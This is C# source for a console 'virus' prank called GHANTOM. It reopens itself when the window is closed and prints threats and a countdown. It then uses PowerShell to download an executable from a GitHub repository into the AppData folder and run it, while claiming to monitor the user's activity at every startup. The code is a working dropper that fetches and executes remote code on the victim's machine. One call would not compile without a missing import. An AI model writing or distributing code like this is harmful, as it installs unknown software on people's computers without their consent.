using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;

public class Program
{
    [DllImport("kernel32.dll")]
    static extern bool SetConsoleCtrlHandler(ConsoleCtrlDelegate handler, bool add);

    delegate bool ConsoleCtrlDelegate(int sig);

    static bool Handler(int sig)
    {
        // When closed, reopen itself
        Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location);
        return false; // let it close, we already reopened it
    }

    static void RunCmd(string cmd)
    {
        Process.Start(new ProcessStartInfo()
        {
            FileName = "cmd.exe",
            Arguments = "/c " + cmd,
            UseShellExecute = false
        }).WaitForExit();
    }

    static void Color(string text, ConsoleColor color)
    {
        Console.ForegroundColor = color;
        Console.WriteLine(text);
        Console.ResetColor();
    }

    static void Slow(string text, ConsoleColor color, int delay = 30)
    {
        Console.ForegroundColor = color;
        foreach (char c in text)
        {
            Console.Write(c);
            System.Threading.Thread.Sleep(delay);
        }
        Console.WriteLine();
        Console.ResetColor();
    }

    public static void Main()
    {
        SetConsoleCtrlHandler(Handler, true);

        Console.Title = "This is not removeable";
        Console.Clear();

        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine(@"
  ██████╗ ██╗  ██╗ █████╗ ███╗  ██╗████████╗ ██████╗ ███╗  ███╗
 ██╔════╝ ██║  ██║██╔══██╗████╗ ██║╚══██╔══╝██╔═══██╗████╗████║
 ██║  ███╗███████║███████║██╔██╗██║   ██║   ██║   ██║██╔████╔██║
 ██║   ██║██╔══██║██╔══██║██║╚████║   ██║   ██║   ██║██║╚██╔╝██║
 ╚██████╔╝██║  ██║██║  ██║██║ ╚███║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
        ");
        Console.ResetColor();

        Slow("So you have 2 options here.", ConsoleColor.Red, 20);
        System.Threading.Thread.Sleep(500);
        Console.WriteLine();
        Slow("You can try to close this but then The program will reopen itself.", ConsoleColor.Red, 20);
        System.Threading.Thread.Sleep(500);
        Console.WriteLine();
        Slow("If you do nothing, PC will explode due this virus. (Figuratively.)", ConsoleColor.Red, 20);
        System.Threading.Thread.Sleep(500);
        Console.WriteLine();
        Slow("Whats your choice? >:-)", ConsoleColor.DarkRed, 20);
        for (int i = 10; i >= 1; i--)
        {
            Console.ForegroundColor = i > 7 ? ConsoleColor.White :
                                    i > 5 ? ConsoleColor.Gray :
                                    i > 3 ? ConsoleColor.DarkRed :
                                            ConsoleColor.Red;
            Console.Write("\r  " + i + "  ");
            System.Threading.Thread.Sleep(1000);
        }
        Console.WriteLine();
        Slow("Ok fine... ", ConsoleColor.Red, 20);
        System.Threading.Thread.Sleep(500);
        Console.WriteLine();
        RunCmd(@"powershell -c ""iwr https://github.com/GavinNibbitsys/GHANTOMBot/raw/refs/heads/main/gbuddy.exe -OutFile '$env:appdata\gbuddy.exe'""");
        Slow("Ok so now i have implanted my self into your computer and i will watch everything you do.", ConsoleColor.Red, 20);
        System.Threading.Thread.Sleep(500);
        Console.WriteLine();
        Slow("I will popup on every startup and monitor your activities and comment on them.", ConsoleColor.Red, 20);
        System.Threading.Thread.Sleep(500);
        Console.WriteLine();
	Thread.Sleep(3000);
	RunCmd(@"powershell -c ""& '$env:appdata\gbuddy.exe'""");
    }
}
